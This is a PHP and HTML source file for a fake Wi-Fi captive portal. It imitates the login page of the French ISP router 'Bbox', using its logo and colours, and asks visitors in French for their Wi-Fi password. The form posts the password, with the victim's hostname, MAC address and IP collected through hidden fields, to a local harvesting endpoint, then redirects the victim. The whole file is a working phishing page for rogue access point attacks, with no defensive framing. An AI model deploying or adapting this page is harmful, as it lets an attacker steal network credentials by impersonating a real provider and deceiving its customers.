<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="utf-8">
    <title>Bbox - Wi-Fi</title>
    <link href='assets/css/bootstrap.min.css' rel="stylesheet">
    <link href='assets/css/progress-bar.css' rel="stylesheet">
    <link href='assets/css/custom.css' rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #0065a6;
        }
        .container {
            max-width: 400px;
            margin: 100px auto;
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        #logo {
            text-align: center;
            margin-bottom: 20px;
        }
        h1, h2 {
            text-align: center;
            margin: 10px 0;
        }
        h1 {
            font-size: 24px;
            color: #333;
        }
        h2 {
            font-size: 16px;
            color: #555;
        }
        input, button {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #0065a6;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #007B9E;
        }
    </style>
</head>
<body>
    <div class="container">
      <div id="logo">
      <svg enable-background="new 0 0 120 40" height="40" viewBox="0 0 120 40" width="120" xmlns="http://www.w3.org/2000/svg"><g fill="#00b5d8"><path d="m21.608 17.129c1.931-1.869 3.155-4.397 3.155-6.868 0-6.247-4.227-10.261-11.558-10.261-1.262 0-3.81 0-6.517 0-4.511 0-6.688 0-6.688 0s0 4.654 0 10.327v20.099c0 3.436.608 5.814 2.031 7.331 1.425 1.519 3.596 2.243 10.723 2.243 10.439 0 15.869-5.088 15.869-12.533.001-4.593-2.187-8.563-7.015-10.338zm-15.702-6.909v-5.261h1.002 4.979c3.204 0 7.274.942 7.274 5.181 0 3.783-3.512 5.593-6.707 5.593h-6.548zm8.012 24.634c-4.737 0-6.295-.082-7.092-.93-.835-.89-.92-2.582-.92-5.567 0-3.888 0-7.66 0-7.66h7.976c6.254 0 8.751 3.006 8.751 7.138 0 4.521-3.169 7.019-8.715 7.019z"/><path d="m32.206.977v25.24c.016 7.624 6.143 13.798 13.771 13.783 7.626-.014 13.8-6.641 13.785-14.266-.016-7.631-5.714-13.368-13.343-13.354-3.236.004-6.91 1.623-8.52 3.833 0 0-.014-12.479-.014-15.237h-5.679zm13.759 33.783c-4.548.01-8.245-3.818-8.253-8.555-.008-4.73 3.672-8.58 8.222-8.589s8.247 3.824 8.253 8.556c.01 4.735-3.671 8.579-8.222 8.588z"/><path d="m111.408 26.203c3.83-2.213 6.402-6.69 5.926-13.304h-5.576c.398 6.188-2.418 10.952-7.199 10.952-4.779 0-7.574-4.848-7.27-10.952h-5.523c-.521 6.401 1.926 10.886 5.941 13.364-3.982 2.335-6.421 6.723-5.941 13.363h5.584c-.285-6.725 2.236-10.952 7.195-10.952 4.957 0 7.568 4.312 7.27 10.952h5.523c.557-6.896-1.988-11.219-5.93-13.423z"/><path d="m76.004 12.251c-7.665.017-13.859 6.241-13.845 13.902.017 7.663 6.236 13.862 13.897 13.847 7.665-.014 13.861-6.237 13.847-13.9-.012-7.66-6.236-13.861-13.899-13.849zm.041 22.488c-4.653.012-8.434-3.841-8.442-8.596-.01-4.754 3.754-8.619 8.407-8.628 4.655-.008 8.438 3.839 8.442 8.597.01 4.753-3.752 8.617-8.407 8.627z"/></g></svg>
      </div>
        <h1>Connexion</h1>
        <h2>Saisissez le mot de passe de votre Wi-Fi pour continuer</h2>
        <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()">
            <input name="email" type="hidden" value="bbox@exemple.com" required>
            <input name="password" id='password-input' type="password" placeholder="Mot de passe" required>
            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
            <input type="hidden" name="target" value="<?=$destination?>">
            <button type="submit">Suivant</button>
        </form>
    </div>
    <script src='assets/js/jquery-3.4.1.min.js'></script>
    <script src='assets/js/bootstrap.min.js'></script>
    <script type="text/javascript">
        function redirect() {
            setTimeout(function() {
              window.location.href = "/captiveportal/index.php";
            }, 100);
        }
    </script>
</body>
</html>
